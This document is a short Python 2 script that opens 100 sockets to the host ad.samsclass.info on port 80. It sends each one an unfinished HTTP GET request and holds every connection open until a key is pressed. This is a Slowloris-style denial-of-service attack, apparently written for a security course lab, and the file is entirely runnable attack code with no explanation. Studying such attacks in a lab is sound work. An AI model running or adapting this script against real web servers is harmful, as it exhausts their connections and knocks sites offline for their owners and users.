import socket
#socket.setdefaulttimeout(2)

target = 'ad.samsclass.info'
port = 80


request = """GET / HTTP/1.1
Host: ad.samsclass.info
Connection: keep-alive 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-None-Match: "b43-56b3a386e3b29-gzip"
If-Modified-Since: Wed, 02 May 2018 14:51:22 GMT
"""
sockets = []
for i in range(100):
    s = socket.socket()
    sockets.append(s)
    s.connect((target, port))
    s.send(request)
#    response = s.recv(1024)

raw_input("Press Enter")
for s in sockets:
    s.close()
